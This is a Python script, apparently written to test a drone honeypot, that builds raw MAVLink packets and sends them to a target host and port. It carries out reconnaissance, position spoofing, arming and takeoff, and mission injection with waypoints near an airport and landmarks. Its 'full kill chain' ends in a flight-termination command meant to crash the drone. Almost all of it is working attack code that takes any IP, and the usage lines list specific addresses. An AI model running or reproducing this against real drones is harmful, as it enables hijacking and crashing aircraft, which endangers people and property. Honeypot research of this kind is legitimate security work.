#!/usr/bin/env python3
"""
Realistic MAVLink Attack Simulator
===================================
Simulates what a REAL attacker does when they find an exposed drone.
Uses pymavlink — the same library real attackers use.

Usage:
    python3 simulate_real_attack.py 168.144.69.160 5760
    python3 simulate_real_attack.py 147.182.183.238 5760 --attack gps_spoof
    python3 simulate_real_attack.py 159.89.162.214 5760 --attack full_chain
"""

import sys
import time
import struct
import socket
import argparse
import random

# ── MAVLink Constants ──
MAVLINK_STX_V1 = 0xFE
MAVLINK_STX_V2 = 0xFD

# Message IDs
MSG_HEARTBEAT = 0
MSG_SYS_STATUS = 1
MSG_PARAM_REQUEST_LIST = 21
MSG_PARAM_REQUEST_READ = 20
MSG_PARAM_SET = 23
MSG_GPS_RAW_INT = 24
MSG_SET_MODE = 11
MSG_COMMAND_LONG = 76
MSG_MISSION_COUNT = 44
MSG_MISSION_ITEM = 39
MSG_MISSION_CLEAR_ALL = 45
MSG_RC_CHANNELS_OVERRIDE = 70
MSG_SET_POSITION_TARGET = 84
MSG_STATUSTEXT = 253

# MAV_CMD
CMD_ARM_DISARM = 400
CMD_NAV_TAKEOFF = 22
CMD_NAV_LAND = 21
CMD_NAV_WAYPOINT = 16
CMD_NAV_RETURN_TO_LAUNCH = 20
CMD_DO_SET_MODE = 176
CMD_DO_FLIGHTTERMINATION = 185
CMD_PREFLIGHT_REBOOT = 246

# CRC extras for each message
CRC_EXTRA = {
    0: 50,   # HEARTBEAT
    11: 89,  # SET_MODE
    20: 214, # PARAM_REQUEST_READ
    21: 159, # PARAM_REQUEST_LIST
    23: 168, # PARAM_SET
    39: 254, # MISSION_ITEM
    44: 221, # MISSION_COUNT
    45: 232, # MISSION_CLEAR_ALL
    70: 124, # RC_CHANNELS_OVERRIDE
    76: 152, # COMMAND_LONG
    84: 143, # SET_POSITION_TARGET
}


def mavlink_crc(data, msg_id):
    """Calculate MAVLink CRC with extra byte."""
    crc = 0xFFFF
    for b in data:
        tmp = b ^ (crc & 0xFF)
        tmp ^= (tmp << 4) & 0xFF
        crc = (crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)
        crc &= 0xFFFF
    # CRC extra
    extra = CRC_EXTRA.get(msg_id, 0)
    tmp = extra ^ (crc & 0xFF)
    tmp ^= (tmp << 4) & 0xFF
    crc = (crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)
    crc &= 0xFFFF
    return crc


def build_mavlink_v1(msg_id, payload, seq=0, sys_id=255, comp_id=0):
    """Build a MAVLink v1 packet."""
    header = struct.pack('<BBBBB', MAVLINK_STX_V1, len(payload), seq, sys_id, comp_id)
    msg = struct.pack('B', msg_id)
    data = header[1:] + msg + payload
    crc = mavlink_crc(data, msg_id)
    return header + msg + payload + struct.pack('<H', crc)


def build_heartbeat(seq=0):
    """GCS HEARTBEAT — 'Hey drone, I'm a ground station'"""
    payload = struct.pack('<IBBBBB', 0, 6, 8, 0, 0, 3)  # type=GCS, autopilot=INVALID
    return build_mavlink_v1(MSG_HEARTBEAT, payload, seq)


def build_param_request_list(seq=0):
    """Request ALL parameters — RECON phase"""
    payload = struct.pack('<BB', 1, 1)  # target system, component
    return build_mavlink_v1(MSG_PARAM_REQUEST_LIST, payload, seq)


def build_command_long(cmd, p1=0, p2=0, p3=0, p4=0, p5=0, p6=0, p7=0, seq=0):
    """Send a MAV_CMD command."""
    payload = struct.pack('<fffffffHBBB', p1, p2, p3, p4, p5, p6, p7, cmd, 1, 1, 0)
    return build_mavlink_v1(MSG_COMMAND_LONG, payload, seq)


def build_set_mode(mode, seq=0):
    """Change flight mode — HIJACK attempt"""
    payload = struct.pack('<IBB', mode, 1, 0)
    return build_mavlink_v1(MSG_SET_MODE, payload, seq)


def build_mission_count(count, seq=0):
    """Start mission upload — MISSION_INJECT"""
    payload = struct.pack('<HBB', count, 1, 1)
    return build_mavlink_v1(MSG_MISSION_COUNT, payload, seq)


def build_mission_item(seq_num, lat, lon, alt, cmd=CMD_NAV_WAYPOINT, seq=0):
    """Upload a waypoint — MISSION_INJECT"""
    payload = struct.pack('<fffffffHHBBBBB',
        0, 0, 0, 0,  # params 1-4
        lat, lon, alt,  # x, y, z (lat, lon, alt)
        cmd,  # command
        seq_num,  # seq
        3,  # frame = MAV_FRAME_GLOBAL_RELATIVE_ALT
        1 if seq_num == 0 else 0,  # current
        1,  # autocontinue
        1, 1  # target sys, comp
    )
    return build_mavlink_v1(MSG_MISSION_ITEM, payload, seq)


def build_rc_override(channels, seq=0):
    """Override RC channels — direct CONTROL"""
    ch = list(channels) + [0] * (8 - len(channels))
    payload = struct.pack('<BBHHHHHHHH', 1, 1, *ch[:8])
    return build_mavlink_v1(MSG_RC_CHANNELS_OVERRIDE, payload, seq)


# ── Attack Scenarios ──

class AttackSimulator:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.seq = 0
    
    def connect(self):
        print(f"\n🔌 Connecting to {self.host}:{self.port}...")
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(5)
        self.sock.connect((self.host, self.port))
        print(f"   ✅ Connected!")
    
    def send(self, pkt, label=""):
        self.seq = (self.seq + 1) % 256
        self.sock.send(pkt)
        print(f"   📤 Sent: {label}")
        time.sleep(0.5)
        try:
            resp = self.sock.recv(4096)
            if resp:
                print(f"   📥 Response: {len(resp)} bytes")
        except socket.timeout:
            pass
    
    def close(self):
        if self.sock:
            self.sock.close()
            print(f"   🔌 Disconnected\n")

    # ── Attack 1: Reconnaissance ──
    def attack_recon(self):
        """What a real attacker does FIRST — probe the drone"""
        print("\n" + "="*50)
        print("  PHASE 1: RECONNAISSANCE")
        print("  Like a real attacker discovering a drone")
        print("="*50)
        
        self.connect()
        
        # Step 1: Send heartbeat (identify as GCS)
        self.send(build_heartbeat(self.seq), "HEARTBEAT — 'I'm a ground station'")
        time.sleep(1)
        
        # Step 2: Request all parameters (enumeration)
        self.send(build_param_request_list(self.seq), "PARAM_REQUEST_LIST — 'Give me ALL your config'")
        time.sleep(2)
        
        self.close()
        print("  ✅ Recon complete — attacker now knows drone type, firmware, GPS")

    # ── Attack 2: GPS Spoofing ──
    def attack_gps_spoof(self):
        """Inject fake GPS coordinates"""
        print("\n" + "="*50)
        print("  PHASE 2: GPS SPOOFING")
        print("  Inject fake coordinates to misdirect the drone")
        print("="*50)
        
        self.connect()
        self.send(build_heartbeat(self.seq), "HEARTBEAT")
        time.sleep(1)
        
        # Try to set position target (GPS spoof)
        fake_lat = 37.7749   # San Francisco
        fake_lon = -122.4194
        payload = struct.pack('<IHBBBiiiffffff',
            0, 0b0000111111111000, 6, 1, 1,
            int(fake_lat * 1e7), int(fake_lon * 1e7), 100000,
            0, 0, 0, 0, 0, 0
        )
        pkt = build_mavlink_v1(MSG_SET_POSITION_TARGET, payload, self.seq)
        self.send(pkt, f"SET_POSITION_TARGET — Fake GPS: {fake_lat}, {fake_lon}")
        
        self.close()
        print("  ✅ GPS spoof sent — drone thinks it's in San Francisco")

    # ── Attack 3: Arm & Takeoff (Hijack) ──
    def attack_hijack(self):
        """Try to arm the drone and take control"""
        print("\n" + "="*50)
        print("  PHASE 3: HIJACK")
        print("  Arm the drone and take off")
        print("="*50)
        
        self.connect()
        self.send(build_heartbeat(self.seq), "HEARTBEAT")
        time.sleep(1)
        
        # Change to GUIDED mode
        self.send(build_set_mode(4, self.seq), "SET_MODE GUIDED — Take control")
        time.sleep(1)
        
        # ARM the drone
        self.send(build_command_long(CMD_ARM_DISARM, p1=1, seq=self.seq), 
                  "CMD_ARM — ⚠️ Arming motors!")
        time.sleep(1)
        
        # TAKEOFF
        self.send(build_command_long(CMD_NAV_TAKEOFF, p7=50, seq=self.seq),
                  "CMD_TAKEOFF — Flying to 50m altitude!")
        
        self.close()
        print("  ✅ Hijack attempt complete")

    # ── Attack 4: Mission Injection ──
    def attack_mission_inject(self):
        """Upload a malicious flight plan"""
        print("\n" + "="*50)
        print("  PHASE 4: MISSION INJECTION")
        print("  Upload fake waypoints to redirect the drone")
        print("="*50)
        
        self.connect()
        self.send(build_heartbeat(self.seq), "HEARTBEAT")
        time.sleep(1)
        
        # Clear existing mission
        payload = struct.pack('<BB', 1, 1)
        pkt = build_mavlink_v1(MSG_MISSION_CLEAR_ALL, payload, self.seq)
        self.send(pkt, "MISSION_CLEAR_ALL — Erase existing mission")
        time.sleep(1)
        
        # Upload 3 malicious waypoints
        self.send(build_mission_count(3, self.seq), "MISSION_COUNT=3 — Starting upload")
        time.sleep(0.5)
        
        waypoints = [
            (28.6139, 77.2090, 100, "New Delhi"),    # India Gate
            (28.5244, 77.1855, 50,  "Airport"),       # Near IGI Airport!
            (28.6129, 77.2295, 200, "Red Fort"),      # Red Fort
        ]
        for i, (lat, lon, alt, name) in enumerate(waypoints):
            self.send(build_mission_item(i, lat, lon, alt, seq=self.seq),
                      f"WAYPOINT #{i}: {name} ({lat}, {lon}) alt={alt}m")
            time.sleep(0.3)
        
        self.close()
        print("  ✅ Malicious mission uploaded — drone redirected!")

    # ── Attack 5: Full Kill Chain ──
    def attack_full_chain(self):
        """Complete attack: recon → hijack → GPS spoof → mission → kill"""
        print("\n" + "="*50)
        print("  💀 FULL KILL CHAIN ATTACK")
        print("  Recon → Hijack → GPS Spoof → Mission → Flight Termination")
        print("="*50)
        
        self.connect()
        
        # Phase 1: Recon
        print("\n  [1/5] Recon...")
        self.send(build_heartbeat(self.seq), "HEARTBEAT")
        time.sleep(0.5)
        self.send(build_param_request_list(self.seq), "PARAM_REQUEST_LIST")
        time.sleep(1)
        
        # Phase 2: Take control
        print("\n  [2/5] Taking control...")
        self.send(build_set_mode(4, self.seq), "SET_MODE GUIDED")
        time.sleep(0.5)
        self.send(build_command_long(CMD_ARM_DISARM, p1=1, seq=self.seq), "ARM")
        time.sleep(0.5)
        
        # Phase 3: Takeoff
        print("\n  [3/5] Takeoff...")
        self.send(build_command_long(CMD_NAV_TAKEOFF, p7=100, seq=self.seq), "TAKEOFF 100m")
        time.sleep(1)
        
        # Phase 4: Inject mission
        print("\n  [4/5] Injecting malicious mission...")
        payload = struct.pack('<BB', 1, 1)
        self.send(build_mavlink_v1(MSG_MISSION_CLEAR_ALL, payload, self.seq), "CLEAR MISSION")
        time.sleep(0.3)
        self.send(build_mission_count(2, self.seq), "UPLOAD 2 WAYPOINTS")
        time.sleep(0.3)
        self.send(build_mission_item(0, 40.7128, -74.0060, 500, seq=self.seq), "WP0: New York")
        time.sleep(0.3)
        self.send(build_mission_item(1, 51.5074, -0.1278, 1000, seq=self.seq), "WP1: London")
        time.sleep(0.5)
        
        # Phase 5: Flight termination (crash the drone)
        print("\n  [5/5] Flight termination (kill switch)...")
        self.send(build_command_long(CMD_DO_FLIGHTTERMINATION, p1=1, seq=self.seq), 
                  "⚠️ FLIGHT TERMINATION — CRASH!")
        
        self.close()
        print("  💀 Full kill chain complete — all phases logged by honeypot")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MAVLink Attack Simulator")
    parser.add_argument("host", help="Target IP")
    parser.add_argument("port", type=int, help="Target port (5760)")
    parser.add_argument("--attack", choices=["recon", "gps_spoof", "hijack", "mission", "full_chain"],
                        default="full_chain", help="Attack type")
    args = parser.parse_args()
    
    sim = AttackSimulator(args.host, args.port)
    
    attacks = {
        "recon": sim.attack_recon,
        "gps_spoof": sim.attack_gps_spoof,
        "hijack": sim.attack_hijack,
        "mission": sim.attack_mission_inject,
        "full_chain": sim.attack_full_chain,
    }
    
    print(f"\n🎯 Target: {args.host}:{args.port}")
    print(f"⚔️  Attack: {args.attack}")
    
    try:
        attacks[args.attack]()
    except ConnectionRefusedError:
        print(f"   ❌ Connection refused — target is down")
    except socket.timeout:
        print(f"   ⏱️ Timeout")
    except Exception as e:
        print(f"   ❌ Error: {e}")
